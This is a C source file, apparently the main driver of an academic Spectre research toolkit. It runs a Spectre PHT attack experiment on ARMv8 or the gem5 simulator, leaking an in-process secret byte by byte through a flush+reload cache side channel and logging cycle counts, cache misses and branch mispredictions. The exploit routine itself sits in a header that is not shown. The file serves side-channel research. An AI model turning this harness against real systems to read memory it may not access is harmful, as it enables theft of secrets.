/**
 * \brief  Spectre Research Toolkit (SRT)
 * \author Pierre AYOUB -- IRISA, CNRS
 * \date   2020
 *
 * \details This file orchestrate the core of Spectre attack and other modules,
 * like arguments and statistics.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

/* Contain Spectre PHT-SA-IP implementation. */
#include "spectre_pht_sa_ip.h"
/* Contain ARMv8 implementation of flush, rdtsc and [im]fence. */
#include "asm.h"
/* Contain "perf_event" functions. */
#include "perf.h"
/* Contain utilities and helper functions. */
#include "util.h"

int main(int argc, char **argv) {
    /** Hold user's command-line specified options. */
    struct arguments arguments;
    /* Initialize command-line options and arguments. */
    arg_init(&arguments);
    /* Parse command-line arguments. Quit if needed. */
    arg_parse(argc, argv, &arguments);

    /* Print statistics header. 'write' is used instead of 'printf' to have a
       progressive display in gem5, and not one final flush at the end. */
    static char * stat_hdr = "total bytes,correct bytes,score sum,elapsed cycles,cache misses,branch mispredicted\n";
    if (!arguments.quiet)
        write(1, stat_hdr, strlen(stat_hdr));

    /* Perform complete experiment 1 time (by default). */
    for (int meta = 0; meta < arguments.meta; meta++) {
        /* Compute the cache hit threshold if not already specified. */
        CACHE_HIT_THRESHOLD = arguments.cache_threshold ? arguments.cache_threshold : flush_reload_threshold();
        /* Distance between legitimate array and secret to read. Spectre will
           attempt to read at this offset and iterate over following bytes. */
        size_t malicious_x = (size_t) (secret - (char*) array1);
        /* Number of iteration to perform from malicious_x, corresponding to
           the length of the secret. */
        int malicious_it = strlen(secret);
        
        /* Array of all guesses, filled one byte at a time when trying to guess
           the secret. */ 
        uint8_t * guesses_values = calloc(malicious_it + 1, sizeof(*guesses_values));
        /* Array of all guess's scores. For one score, the higher the better,
         * unless it's very low because we have a clear success, which is even
         * better. */
        int * guesses_scores = calloc(malicious_it + 1, sizeof(*guesses_scores));

        /* Write to the probe array to force not copy-on-write zero pages in
           RAM. If not, his latency of writing will be too high to be possible
           in the transient execution window. */
        memset(array2, 1, sizeof(array2));
        mfence();

        /* Initialize and start performance counters. */
        if (!gem5_is_sim())
            perf_init();

        /* Start time of experiment. */
        register uint64_t time_start = rdtsc();
        
        /* Iterate over each secret's byte. */
        for (int i = 0; i < malicious_it; i++, malicious_x++) {
            /* Read one byte at offset malicious_x from array1. Store the
               guessed value and its corresponding score. */
            spectre_pht_sa_ip_read(malicious_x, &arguments, &guesses_values[i], &guesses_scores[i]);
        }

        /* Register end of the experiment. */
        register uint64_t time_end = rdtsc();

        /* Get and close the performance counters. */
        uint64_t counter_cache_miss  = 0;
        uint64_t counter_branch_miss = 0;
        if (!gem5_is_sim()) {
            counter_cache_miss  = perf_read_cache_miss();
            counter_branch_miss = perf_read_branch_miss();
            perf_close();
        }

        /* Print statistics entry for this meta. Same as above concerning
           'write' vs. 'printf'. */
        char stat_entry[1024];
        snprintf(stat_entry, 1024, "%d,%d,%d,%lu,%lu,%lu\n",
                 malicious_it,
                 malicious_it - string_hamming_dist(secret, (char *) guesses_values, malicious_it),
                 int_sum(guesses_scores, malicious_it),
                 time_end - time_start,
                 counter_cache_miss,
                 counter_branch_miss);
        write(1, stat_entry, strlen(stat_entry));

        /* Freeing memory. */
        guesses_values = (free(guesses_values), NULL);
        guesses_scores = (free(guesses_scores), NULL);
    }
	return 0;
}
